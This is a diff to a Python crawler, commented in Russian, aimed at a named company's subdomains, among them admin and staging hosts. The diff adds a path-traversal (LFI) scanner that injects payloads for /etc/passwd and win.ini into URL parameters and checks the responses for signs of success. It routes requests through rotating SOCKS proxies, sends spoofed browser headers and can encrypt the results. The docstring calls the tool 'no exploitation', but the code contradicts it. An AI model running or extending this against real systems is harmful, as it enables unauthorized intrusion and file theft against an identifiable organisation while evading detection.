@@ -1,17 +1,36 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """Многопоточный паук-краулер для ABET Global через пул SOCKS/HTTP прокси с ротацией.
-Только разведка: GET-запросы, сбор URL/JS/форм/robots. Без эксплуатации."""
+Разведка: GET-запросы, сбор URL/JS/форм/robots + LFI-проверка параметров (полуактивная).
+Флаги: --lfi (LFI-тест), --kirpich (age-шифрование результатов, ключ проекта).
+Без эксплуатации: только чтение и полуактивные GET-запросы через прокси."""
 import re
 import sys
+import os
 import time
+import json
 import urllib3
 import requests
+import subprocess
 import concurrent.futures as cf
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-HOSTS = [
+FLAG_LFI = "--lfi" in sys.argv
+FLAG_KIRPICH = "--kirpich" in sys.argv
+
+LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
+LFI_PAYLOADS = (
+    "../../../../../../etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+    "..\\..\\..\\..\\..\\windows\\win.ini",
+    "../../../../../../windows/win.ini",
+    "....//....//....//etc/passwd",
+)
+LFI_INDICATORS = ("root:", "daemon:", "win.ini", "[fonts]", "[extensions]", "boot.ini", "nobody:", "syntax error", "failed to open stream")
+
+HOSTS = sys.argv[1].split(",") if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else [
     "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
     "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
     "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
@@ -21,10 +40,34 @@ HOSTS = [
 
 PROXIES = [
     {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
-    {"http": "socks5h://101.36.104.239:10808", "https": "socks5h://101.36.104.239:10808"},
-    {"http": "socks5h://101.36.104.46:10808", "https": "socks5h://101.36.104.46:10808"},
     {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
 ]
+
+def _fresh_proxies():
+    """Свежие SOCKS5 из пула (ротатор уже перебирает мёртвых), до 8 штук."""
+    try:
+        with open("/root/office/container/pool/output/socks5_pool.json") as f:
+            data = json.load(f)
+        out = []
+        for p in data.get("proxies", []):
+            if p.get("alive") and p.get("proto") == "socks5" and ":" in p.get("proxy", ""):
+                out.append({"http": "socks5h://" + p["proxy"], "https": "socks5h://" + p["proxy"]})
+            if len(out) >= 8:
+                break
+        return out
+    except Exception:
+        return []
+
+def _refresh_proxies():
+    global PROXIES
+    fresh = _fresh_proxies()
+    if fresh:
+        base = [
+            {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
+            {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
+        ]
+        PROXIES = base + fresh
+        print(f"[spider] пул прокси обновлён: {len(PROXIES)} (ротатор + {len(fresh)} свежих)", flush=True)
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
 MAX_WORKERS = 16
@@ -62,16 +105,26 @@ def is_same_host(u, host):
         return False
 
 def fetch(url, host):
-    """GET с ротацией прокси. Возвращает (status, content_type, body) или (0, None, None)."""
-    proxy = next_proxy()
-    try:
-        r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
-            "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9"}, verify=False, timeout=TIMEOUT,
-            allow_redirects=True)
-        return (r.status_code, (r.headers.get('Content-Type') or '').lower(), r.text)
-    except Exception:
-        return (0, None, None)
+    """GET с ротацией прокси и failover (до 3 прокси на запрос). Возвращает (status, content_type, body) или (0, None, None)."""
+    for _try in range(3):
+        proxy = next_proxy()
+        try:
+            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
+                "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
+                "Accept-Encoding": "gzip, deflate",
+                "Referer": "https://www.google.com/",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site",
+                "Cache-Control": "no-cache"}, verify=False, timeout=TIMEOUT,
+                allow_redirects=True)
+            if r.status_code and r.status_code < 400:
+                return (r.status_code, (r.headers.get('Content-Type') or '').lower(), r.text)
+            # 4xx/5xx — пробуем следующий прокси (сайт может блочить этот IP)
+            continue
+        except Exception:
+            continue
+    return (0, None, None)
 
 def crawl_host(host):
     base = f"https://{host}/"
@@ -127,10 +180,37 @@ def crawl_host(host):
                 to_visit.append(u); depth_map[u] = d + 1
     return host, found
 
+def lfi_check(host, url):
+    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
+    Возвращает список находок [(param, payload, code, indicator)]."""
+    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+    hits = []
+    if "?" not in url:
+        return hits
+    parsed = urlparse(url)
+    params = parse_qsl(parsed.query, keep_blank_values=True)
+    for name, val in params:
+        if name.lower() not in LFI_NAMES:
+            continue
+        for payload in LFI_PAYLOADS:
+            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
+            target = urlunparse(parsed._replace(query=new_q))
+            st, ct, body = fetch(target, host)
+            if st == 200 and body:
+                low = body.lower()
+                for ind in LFI_INDICATORS:
+                    if ind in low:
+                        hits.append((name, payload, st, ind))
+                        break
+    return hits
+
 def main():
-    out_urls = "/root/office/output/abet_spider_urls.txt"
-    out_js = "/root/office/output/abet_spider_js.txt"
-    out_forms = "/root/office/output/abet_spider_forms.txt"
+    target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
+    out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
+    out_js = f"/root/office/output/{target_name}_spider_js.txt"
+    out_forms = f"/root/office/output/{target_name}_spider_forms.txt"
+    lfi_out = f"/root/office/output/{target_name}_lfi.txt"
+    _refresh_proxies()
     all_urls, all_js, all_forms = set(), set(), []
     robots_all, sitemap_all, errs = {}, {}, {}
     with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
@@ -155,8 +235,38 @@ def main():
     with open(out_forms, "w") as f:
         for fm in all_forms:
             f.write(f"{fm['method']} {fm['page']} -> action={fm['action']} inputs={fm['inputs']}\n")
+    # LFI-проход по всем собранным URL с параметрами
+    lfi_hits = []
+    cands = []
+    if FLAG_LFI:
+        print("\n=== LFI-ПРОВЕРКА (полуактивная, через прокси) ===", flush=True)
+        candidates = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
+        cands = list(dict.fromkeys(candidates))[:80]
+        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
+            futs = {ex.submit(lfi_check, "spider", u): u for u in cands}
+            for fu in cf.as_completed(futs):
+                u = futs[fu]
+                try:
+                    for h in fu.result():
+                        lfi_hits.append((u, *h))
+                        print(f"[LFI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
+                except Exception:
+                    pass
+    with open(lfi_out, "w") as f:
+        f.write(f"# LFI-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(cands) if FLAG_LFI else 0}\n")
+        for hit in lfi_hits:
+            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
+    # Кирпич: шифрование результатов age-ключом проекта
+    if FLAG_KIRPICH:
+        for f_ in (out_urls, out_js, out_forms, lfi_out):
+            if os.path.exists(f_):
+                try:
+                    subprocess.run(["kirpich-encrypt.sh", f_], check=True, capture_output=True)
+                    print(f"[KIRPICH] зашифровано: {f_}.age", flush=True)
+                except Exception as e:
+                    print(f"[KIRPICH] не удалось ({f_}): {e}", flush=True)
     print("\n=== ИТОГО ===")
-    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)}")
+    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)}")
     print("\n--- ROBOTS ---")
     for h, r in robots_all.items():
         if r:
